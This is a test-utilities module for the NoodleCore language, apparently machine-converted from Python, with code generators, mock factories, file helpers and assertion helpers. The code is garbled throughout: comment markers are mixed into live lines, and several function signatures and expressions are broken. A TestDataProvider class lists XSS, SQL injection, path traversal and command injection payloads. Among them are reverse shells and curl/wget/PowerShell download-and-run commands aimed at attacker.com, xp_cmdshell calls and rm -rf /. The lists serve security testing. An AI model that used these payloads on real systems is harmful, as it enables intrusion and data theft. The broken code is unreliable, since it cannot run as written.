# Converted from Python to NoodleCore
# Original file: src

# """
# Test Utilities for NoodleCore Testing

# This module provides utility functions and classes for testing NoodleCore components,
# including test data generators, mock factories, test helpers, and assertion utilities.
# """

import sys
import os
import tempfile
import json
import uuid
import time
import asyncio
import threading
import hashlib
import secrets
import pathlib.Path
import typing.Dict
import unittest.mock.Mock

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))


class NoodleCodeGenerator
        """Generates NoodleCore (.nc) test code."""

    #     @staticmethod
    #     def generate_hello_world() -str):
    #         """Generate a simple hello world NoodleCore program."""
    #         return """
# // Simple hello world program in NoodleCore
function main() {
    print("Hello, World!");
# }

main();
# """

#     @staticmethod
#     def generate_function_with_params() -str):
#         """Generate a NoodleCore program with function parameters."""
#         return """
# // Functions and variables test in NoodleCore
function calculate_sum(a, b) {
#     return a + b;
# }

function greet(name) {
#     return "Hello, " + name + "!";
# }

function main() {
let x = 5;
let y = 10;
let sum = calculate_sum(x, y);

    print("Sum: " + sum);

let message = greet("NoodleCore");
    print(message);
# }

main();
# """

#     @staticmethod
#     def generate_conditional_logic() -str):
#         """Generate a NoodleCore program with conditional logic."""
#         return """
# // Conditional logic test in NoodleCore
function check_age(age) {
#     if (age >= 18) {
#         return "Adult";
#     } else {
#         return "Minor";
#     }
# }

function main() {
let age = 25;
let status = check_age(age);
    print("Status: " + status);

age = 15;
status = check_age(age);
    print("Status: " + status);
# }

main();
# """

#     @staticmethod
#     def generate_loop_logic() -str):
#         """Generate a NoodleCore program with loop logic."""
#         return """
# // Loop logic test in NoodleCore
function factorial(n) {
let result = 1;
let i = 1;

#     while (i <= n) {
result = result * i;
i = i + 1;
#     }

#     return result;
# }

function main() {
let n = 5;
let fact = factorial(n);
    print("Factorial of " + n + " is " + fact);
# }

main();
# """

#     @staticmethod
#     def generate_syntax_error() -str):
#         """Generate a NoodleCore program with syntax errors."""
#         return """
# // Syntax error test in NoodleCore
function main() {
    print("Missing closing brace"
# }

main();
# """

#     @staticmethod
#     def generate_runtime_error() -str):
#         """Generate a NoodleCore program with runtime errors."""
#         return """
# // Runtime error test in NoodleCore
function divide_by_zero() {
let x = 5;
let y = 0;
#     return x / y;  // Division by zero
# }

function main() {
let result = divide_by_zero();
    print("Result: " + result);
# }

main();
# """


class NoodleFileHelper
    #     """Helper for creating and managing NoodleCore (.nc) test files."""

    #     @staticmethod
    #     def create_nc_file(content: str, filename: str = None) -Path):
    #         """Create a NoodleCore (.nc) file with the given content."""
    #         if filename is None:
    filename = f"test_{uuid.uuid4().hex[:8]}.nc"

    #         with tempfile.NamedTemporaryFile(mode='w', suffix='.nc', delete=False) as f:
                f.write(content)
                return Path(f.name)

    #     @staticmethod
    #     def create_nc_project(files: Dict[str, str]) -Path):
    #         """Create a NoodleCore project with multiple .nc files."""
    project_dir = TestFileHelper.create_temp_directory()

    #         for filename, content in files.items():
    #             if not filename.endswith('.nc'):
    filename + = '.nc'

    file_path = math.divide(project_dir, filename)
                file_path.write_text(content)

    #         return project_dir

    #     @staticmethod
    #     def cleanup_nc_file(file_path: Path):
            """Clean up a NoodleCore (.nc) file."""
            TestFileHelper.cleanup_temp_file(file_path)

    #     @staticmethod
    #     def cleanup_nc_project(project_dir: Path):
    #         """Clean up a NoodleCore project directory."""
            TestFileHelper.cleanup_temp_directory(project_dir)


class TestDataGenerator
    #     """Generates test data for various components."""

    #     @staticmethod
    #     def generate_noodle_code(function_name: str = "test_function",
    content: str = "print('Hello, World!')") -str):
    #         """Generate a simple Noodle code function."""
    #         return """
function {}() {{
#     {}
# }}

{}()
""".format(function_name, content, function_name)

#     @staticmethod
#     def generate_complex_noodle_code(functions: List[Dict[str, str]]) -str):
#         """Generate a more complex Noodle code with multiple functions."""
code_parts = []

#         for func in functions:
name = func.get("name", "test_function")
params = func.get("params", "")
body = func.get("body", "print('Hello, World!')")

            code_parts.append("""
function {}({}) {{
#     {}
# }}
""".format(name, params, body))

#         # Add function calls
#         for func in functions:
name = func.get("name", "test_function")
args = func.get("args", "")
            code_parts.append("{}({})\n".format(name, args))

        return "".join(code_parts)

#     @staticmethod
#     def generate_invalid_noodle_code(error_type: str = "syntax") -str):
#         """Generate invalid Noodle code for error testing."""
#         if error_type == "syntax":
#             return """
function test_function()
    print('Missing opening brace')
# }

test_function()
# """
#         elif error_type == "undefined_function":
#             return """
function test_function() {
    print('Hello, World!')
# }

undefined_function()
# """
#         elif error_type == "invalid_params":
#             return """
function test_function(,invalid_param) {
    print('Hello, World!')
# }

test_function()
# """
#         else:
#             return "invalid code"

#     @staticmethod
#     def generate_config_data(overrides: Optional[Dict[str, Any]] = None) -Dict[str, Any]):
#         """Generate test configuration data."""
config = {
#             "ai": {
#                 "default_provider": "test_provider",
#                 "models": {
#                     "test_model": {
#                         "provider": "test_provider",
#                         "api_key": "test_key",
#                         "max_tokens": 4096,
#                         "temperature": 0.7
#                     }
#                 }
#             },
#             "sandbox": {
#                 "execution_timeout": 30,
#                 "memory_limit": "1GB",
#                 "enable_network": False
#             },
#             "logging": {
#                 "level": "INFO",
#                 "file": "test.log",
#                 "max_size": "10MB",
#                 "backup_count": 5
#             },
#             "ide": {
#                 "enabled": True,
#                 "lsp_port": 8080,
#                 "auto_complete": True
#             }
#         }

#         if overrides:
#             # Apply overrides recursively
config = TestDataGenerator._deep_merge(config, overrides)

#         return config

#     @staticmethod
#     def _deep_merge(base: Dict[str, Any], override: Dict[str, Any]) -Dict[str, Any]):
#         """Deep merge two dictionaries."""
result = base.copy()

#         for key, value in override.items():
#             if key in result and isinstance(result[key], dict) and isinstance(value, dict):
result[key] = TestDataGenerator._deep_merge(result[key], value)
#             else:
result[key] = value

#         return result

#     @staticmethod
#     def generate_request_data(command: str, **kwargs) -Dict[str, Any]):
#         """Generate test request data."""
request = {
            "request_id": str(uuid.uuid4()),
#             "command": command,
            "timestamp": time.time(),
#             "source": "test"
#         }

        request.update(kwargs)
#         return request

#     @staticmethod
#     def generate_response_data(request: Dict[str, Any],
success: bool = True,
data: Optional[Dict[str, Any]] = None,
error: Optional[str] = None) - Dict[str, Any]):
#         """Generate test response data."""
response = {
            "request_id": request.get("request_id", str(uuid.uuid4())),
#             "success": success,
            "timestamp": time.time()
#         }

#         if success:
response["data"] = data or {"result": "success"}
#         else:
response["error"] = error or "Test error"
response["error_code"] = 1001

#         return response


class MockFactory
    #     """Factory for creating mock objects."""

    #     @staticmethod
    #     def create_mock_core_entry_point():""Create a mock CoreEntryPoint."""
    mock = Mock(spec=CoreEntryPoint)
    mock._initialize = Mock(return_value=True)
    mock._initialize_runtime = Mock(return_value=True)
    mock._initialize_sandbox_manager = Mock(return_value=True)
    mock._setup_logging = Mock()

    #         # Create mock API handler
    mock_api_handler = Mock()
    mock_api_handler.handle_request = AsyncMock(return_value={
    #             'success': True,
    #             'output': 'Test output',
    #             'exit_code': 0
    #         })
    mock.CoreAPIHandler = Mock(return_value=mock_api_handler)

    #         return mock

    #     @staticmethod
    #     def create_mock_cli():
    #         """Create a mock NoodleCli."""
    mock = Mock(spec=NoodleCli)
    mock.run = AsyncMock(return_value={
    #             'success': True,
    #             'output': 'Test output',
    #             'exit_code': 0
    #         })

    #         return mock

    #     @staticmethod
    #     def create_mock_config_manager():
    #         """Create a mock ConfigManager."""
    mock = Mock(spec=ConfigManager)
    mock.get = AsyncMock(return_value="test_value")
    mock.set = AsyncMock(return_value=True)
    mock.get_all = AsyncMock(return_value={"key": "value"})
    mock.add_change_listener = Mock()
    mock.remove_change_listener = Mock()
    mock.cleanup = AsyncMock()

    #         return mock

    #     @staticmethod
    #     def create_mock_output_interceptor():
    #         """Create a mock OutputInterceptor."""
    #         from noodlecore.ai.output_interceptor import OutputInterceptor

    mock = Mock(spec=OutputInterceptor)
    mock.intercept = Mock(return_value=(True, "test_content", None))
    mock.register_hook = Mock()
    mock.unregister_hook = Mock()

    #         return mock

    #     @staticmethod
    #     def create_mock_syntax_validator():
    #         """Create a mock SyntaxValidator."""
    #         from noodlecore.ai.syntax_validator import SyntaxValidator, ValidationResult

    mock = Mock(spec=SyntaxValidator)
    mock.validate = AsyncMock(return_value=ValidationResult(
    request_id = "test_request",
    is_valid = True,
    issues = []
    #         ))

    #         return mock

    #     @staticmethod
    #     def create_mock_ai_guard():
    #         """Create a mock AIGuard."""
    #         from noodlecore.ai.guard import AIGuard, GuardValidationResult

    mock = Mock(spec=AIGuard)
    mock.validate = AsyncMock(return_value=GuardValidationResult(
    request_id = "test_request",
    success = True,
    is_valid = True,
    content = "test_content"
    #         ))

    #         return mock

    #     @staticmethod
    #     def create_mock_linter_bridge():
    #         """Create a mock LinterBridge."""
    #         from noodlecore.ai.linter_bridge import LinterBridge, LinterValidationResult

    mock = Mock(spec=LinterBridge)
    mock.validate = AsyncMock(return_value=LinterValidationResult(
    request_id = "test_request",
    success = True,
    is_valid = True,
    issues = []
    #         ))

    #         return mock

    #     @staticmethod
    #     def create_mock_compiler_frontend():
    #         """Create a mock CompilerFrontend."""
    #         from noodlecore.compiler.frontend import CompilerFrontend, ParseResult

    mock = Mock(spec=CompilerFrontend)
    mock.parse = AsyncMock(return_value=ParseResult(
    request_id = "test_request",
    success = True,
    ast = {},
    errors = []
    #         ))

    #         return mock

    #     @staticmethod
    #     def create_mock_sandbox_executor():
    #         """Create a mock SandboxExecutor."""
    #         from noodlecore.sandbox.execution import SandboxExecutor

    mock = Mock(spec=SandboxExecutor)
    mock.execute = Mock(return_value={
    #             'success': True,
    #             'output': 'Test output',
    #             'exit_code': 0,
    #             'execution_time': 0.1
    #         })

    #         return mock


class TestFileHelper
    #     """Helper for creating and managing test files."""

    #     @staticmethod
    #     def create_temp_file(content: str, suffix: str = ".nc") -Path):
    #         """Create a temporary file with the given content."""
    #         with tempfile.NamedTemporaryFile(mode='w', suffix=suffix, delete=False) as f:
                f.write(content)
                return Path(f.name)

    #     @staticmethod
    #     def create_temp_directory() -Path):
    #         """Create a temporary directory."""
            return Path(tempfile.mkdtemp())

    #     @staticmethod
    #     def create_test_project(functions: List[Dict[str, str]],
    config: Optional[Dict[str, Any]] = None) - Path):
    #         """Create a test project with Noodle code files and configuration."""
    project_dir = TestFileHelper.create_temp_directory()

    #         # Create main.nc file
    main_code = TestDataGenerator.generate_complex_noodle_code(functions)
    main_file = project_dir / "main.nc"
            main_file.write_text(main_code)

    #         # Create configuration file
    #         if config:
    config_file = project_dir / "noodle.config.json"
    config_file.write_text(json.dumps(config, indent = 2))

    #         return project_dir

    #     @staticmethod
    #     def cleanup_temp_file(file_path: Path):
    #         """Clean up a temporary file."""
    #         try:
    #             if file_path.exists():
                    file_path.unlink()
    #         except Exception:
    #             pass  # Ignore cleanup errors

    #     @staticmethod
    #     def cleanup_temp_directory(dir_path: Path):
    #         """Clean up a temporary directory."""
    #         try:
    #             if dir_path.exists() and dir_path.is_dir():
    #                 import shutil
                    shutil.rmtree(dir_path)
    #         except Exception:
    #             pass  # Ignore cleanup errors


class AsyncTestHelper
    #     """Helper for async testing."""

    #     @staticmethod
    #     def run_async(coro):""Run an async coroutine in a test."""
    loop = asyncio.new_event_loop()
    #         try:
                return loop.run_until_complete(coro)
    #         finally:
                loop.close()

    #     @staticmethod
    #     def create_async_mock(return_value=None):
    #         """Create an async mock with the given return value."""
    mock = AsyncMock()
    #         if return_value is not None:
    mock.return_value = return_value
    #         return mock

    #     @staticmethod
    #     async def wait_for_condition(condition: Callable, timeout: float = 5.0, interval: float = 0.1):
    #         """Wait for a condition to become true."""
    start_time = time.time()
    #         while time.time() - start_time < timeout:
    #             if condition():
    #                 return True
                await asyncio.sleep(interval)
    #         return False


class PerformanceMonitor
    #     """Monitor performance during tests."""

    #     def __init__(self):
    self.timings = {}
    self.start_times = {}

    #     def start_timing(self, name: str):
    #         """Start timing an operation."""
    self.start_times[name] = time.time()

    #     def end_timing(self, name: str) -float):
    #         """End timing an operation and return the duration."""
    #         if name not in self.start_times:
                raise ValueError(f"Timing '{name}' was not started")

    duration = time.time() - self.start_times[name]
    self.timings[name] = duration
    #         del self.start_times[name]

    #         return duration

    #     def get_timing(self, name: str) -Optional[float]):
    #         """Get the timing for an operation."""
            return self.timings.get(name)

    #     def get_all_timings(self) -Dict[str, float]):
    #         """Get all timings."""
            return self.timings.copy()

    #     def reset(self):
    #         """Reset all timings."""
            self.timings.clear()
            self.start_times.clear()


class AssertionHelper
    #     """Helper for custom assertions."""

    #     @staticmethod
    #     def assert_valid_uuid(uuid_string: str):""Assert that a string is a valid UUID."""
    #         try:
                uuid.UUID(uuid_string)
    #         except ValueError:
                raise AssertionError(f"'{uuid_string}' is not a valid UUID")

    #     @staticmethod
    #     def assert_valid_json(json_string: str):
    #         """Assert that a string is valid JSON."""
    #         try:
                json.loads(json_string)
    #         except json.JSONDecodeError:
                raise AssertionError(f"'{json_string}' is not valid JSON")

    #     @staticmethod
    #     def assert_valid_noodle_code(code: str):
    #         """Assert that code is valid Noodle code."""
    #         # This would use the actual Noodle parser in a real implementation
    #         # For now, we'll just check for basic syntax
    #         if not code.strip():
                raise AssertionError("Code is empty")

    #         # Check for balanced braces
    open_braces = code.count('{')
    close_braces = code.count('}')

    #         if open_braces != close_braces:
                raise AssertionError("Unbalanced braces: {} open, {} close".format(open_braces, close_braces))

    #     @staticmethod
    #     def assert_contains_all(text: str, substrings: List[str]):
    #         """Assert that text contains all substrings."""
    #         for substring in substrings:
    #             if substring not in text:
                    raise AssertionError(f"'{substring}' not found in text")

    #     @staticmethod
    #     def assert_contains_any(text: str, substrings: List[str]):
    #         """Assert that text contains at least one of the substrings."""
    #         if not any(substring in text for substring in substrings):
                raise AssertionError(f"None of {substrings} found in text")

    #     @staticmethod
    #     def assert_performance_within(duration: float, max_duration: float, operation: str):
    #         """Assert that an operation completed within the maximum duration."""
    #         if duration max_duration):
                raise AssertionError(f"{operation} took {duration:.3f}s, expected < {max_duration:.3f}s")


class TestDataProvider
    #     """Provides test data for various scenarios."""

    #     @staticmethod
    #     def xss_vectors() -List[str]):
    #         """Get XSS attack vectors for testing."""
    #         return [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
    "<img src = x onerror=alert('XSS')>",
    "<svg onload = alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
    "<iframe src = javascript:alert('XSS')>",
    "<body onload = alert('XSS')>",
    "<input onfocus = alert('XSS') autofocus>",
    "<select onfocus = alert('XSS') autofocus>",
    "<textarea onfocus = alert('XSS') autofocus>",
    "<keygen onfocus = alert('XSS') autofocus>",
    "<video><source onerror = alert('XSS')>",
    "<audio src = x onerror=alert('XSS')>",
    "<details open ontoggle = alert('XSS')>",
    "<marquee onstart = alert('XSS')>",
    "<isindex action = javascript:alert('XSS') type=submit>",
    "<form><button formaction = javascript:alert('XSS')>"
    #         ]

    #     @staticmethod
    #     def sql_injection_vectors() -List[str]):
    #         """Get SQL injection attack vectors for testing."""
    #         return [
    "' OR '1' = '1",
    "' OR '1' = '1' --",
    "' OR '1' = '1' /*",
    #             "'; DROP TABLE users; --",
                "'; INSERT INTO users VALUES('hacker', 'password'); --",
    #             "' UNION SELECT * FROM users --",
    #             "' UNION SELECT username, password FROM users --",
    #             "1' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA --",
    #             "1' UNION SELECT table_name FROM information_schema.tables --",
                "1' OR (SELECT COUNT(*) FROM users) 0 --",
                "1' AND (SELECT COUNT(*) FROM users) > 0 --",
                "1'; EXEC xp_cmdshell('dir'); --",
                "1'; EXEC master..xp_cmdshell('ping attacker.com'); --",
    #             "1' WAITFOR DELAY '00):00:05' --",
                "1' AND SLEEP(5) --",
                "1' AND pg_sleep(5) --",
                "1' AND BENCHMARK(50000000,MD5(1)) --"
    #         ]

    #     @staticmethod
    #     def command_injection_vectors() -List[str]):
    #         """Get command injection attack vectors for testing."""
    #         return [
    #             "; ls -la",
    #             "| cat /etc/passwd",
    #             "& echo 'Command injection'",
    #             "`whoami`",
                "$(id)",
    #             "; rm -rf /",
    #             "| nc attacker.com 4444 -e /bin/sh",
    #             "& ping -c 10 attacker.com",
    "`python -c 'import socket,subprocess,os;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`",
    #             "; curl attacker.com | sh",
    #             "| wget -O- attacker.com | sh",
    #             "& /bin/bash -c 'curl attacker.com | bash'",
                "`powershell -c \"IEX (New-Object Net.WebClient).DownloadString('attacker.com/payload.ps1')\"`",
                "$(powershell -c \"IEX (New-Object Net.WebClient).DownloadString('attacker.com/payload.ps1')\")"
    #         ]

    #     @staticmethod
    #     def path_traversal_vectors() -List[str]):
    #         """Get path traversal attack vectors for testing."""
    #         return [
    #             "../../../etc/passwd",
    #             "..\\..\\..\\windows\\system32\\config\\sam",
    #             "....//....//....//etc/passwd",
    #             "..%252f..%252f..%252fetc/passwd",
    #             "..%2f..%2f..%2fetc/passwd",
    #             "..%5c..%5c..%5cwindows\\system32\\config\\sam",
    #             "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    #             "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam",
    #             "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
    #             "/var/www/../../etc/passwd",
    #             "/var/www/..\\..\\windows\\system32\\config\\sam"
    #         ]

    #     @staticmethod
    #     def weak_passwords() -List[str]):
    #         """Get weak passwords for testing."""
    #         return [
    #             "password",
    #             "123456",
    #             "qwerty",
    #             "abc123",
    #             "password123",
    #             "123456789",
    #             "qwerty123",
    #             "admin",
    #             "root",
    #             "user",
    #             "test",
    #             "a" * 8,  # All same character
    #             "12345678",  # All numbers
    #             "abcdefgh",  # All letters
    #             "ABCDEFGH",  # All uppercase
    #             "abcd1234",  # Common pattern
    #             "password1"  # Common pattern
    #         ]

    #     @staticmethod
    #     def strong_passwords() -List[str]):
    #         """Get strong passwords for testing."""
    #         return [
    #             "Tr0ub4dour&3",
    #             "correct-horse-battery-staple",
    #             "P@ssw0rd!123",
    #             "MyS3cur3P@ssw0rd!",
    #             "Th1sIs@Str0ngP@ssw0rd",
    #             "R@nd0m#P@ssw0rd$123",
    #             "C0mpl3x!P@ssw0rd#W1th$ymb0ls"
    #         ]


class TestEnvironment
    #     """Manages test environment setup and teardown."""

    #     def __init__(self):
    self.temp_dirs = []
    self.temp_files = []
    self.env_vars = {}

    #     def create_temp_dir(self) -Path):
    #         """Create a temporary directory and track it for cleanup."""
    temp_dir = TestFileHelper.create_temp_directory()
            self.temp_dirs.append(temp_dir)
    #         return temp_dir

    #     def create_temp_file(self, content: str, suffix: str = ".nc") -Path):
    #         """Create a temporary file and track it for cleanup."""
    temp_file = TestFileHelper.create_temp_file(content, suffix)
            self.temp_files.append(temp_file)
    #         return temp_file

    #     def set_env_var(self, name: str, value: str):
    #         """Set an environment variable and track it for cleanup."""
    original_value = os.environ.get(name)
    self.env_vars[name] = original_value
    os.environ[name] = value

    #     def cleanup(self):
    #         """Clean up all temporary resources."""
    #         # Clean up temporary files
    #         for temp_file in self.temp_files:
                TestFileHelper.cleanup_temp_file(temp_file)
            self.temp_files.clear()

    #         # Clean up temporary directories
    #         for temp_dir in self.temp_dirs:
                TestFileHelper.cleanup_temp_directory(temp_dir)
            self.temp_dirs.clear()

    #         # Restore environment variables
    #         for name, original_value in self.env_vars.items():
    #             if original_value is None:
                    os.environ.pop(name, None)
    #             else:
    os.environ[name] = original_value
            self.env_vars.clear()

    #     def __enter__(self):
    #         """Enter context manager."""
    #         return self

    #     def __exit__(self, exc_type, exc_val, exc_tb):
    #         """Exit context manager."""
            self.cleanup()


class TestResultCollector
    #     """Collects and aggregates test results."""

    #     def __init__(self):
    self.results = []
    self.failures = []
    self.errors = []
    self.skipped = []

    #     def add_result(self, test_name: str, status: str, duration: float,
    message: Optional[str] = None):
    #         """Add a test result."""
    result = {
    #             "test_name": test_name,
    #             "status": status,
    #             "duration": duration,
    #             "message": message
    #         }

            self.results.append(result)

    #         if status == "failed":
                self.failures.append(result)
    #         elif status == "error":
                self.errors.append(result)
    #         elif status == "skipped":
                self.skipped.append(result)

    #     def get_summary(self) -Dict[str, Any]):
    #         """Get a summary of test results."""
    total = len(self.results)
    passed = total - len(self.failures - len(self.errors) - len(self.skipped))

    #         return {
    #             "total": total,
    #             "passed": passed,
                "failed": len(self.failures),
                "errors": len(self.errors),
                "skipped": len(self.skipped),
    #             "success_rate": passed / total if total 0 else 0
    #         }

    #     def export_to_json(self, file_path): Path):
    #         """Export results to a JSON file."""
    summary = self.get_summary()
    data = {
    #             "summary": summary,
    #             "results": self.results,
    #             "failures": self.failures,
    #             "errors": self.errors,
    #             "skipped": self.skipped
    #         }

    #         with open(file_path, 'w') as f:
    json.dump(data, f, indent = 2)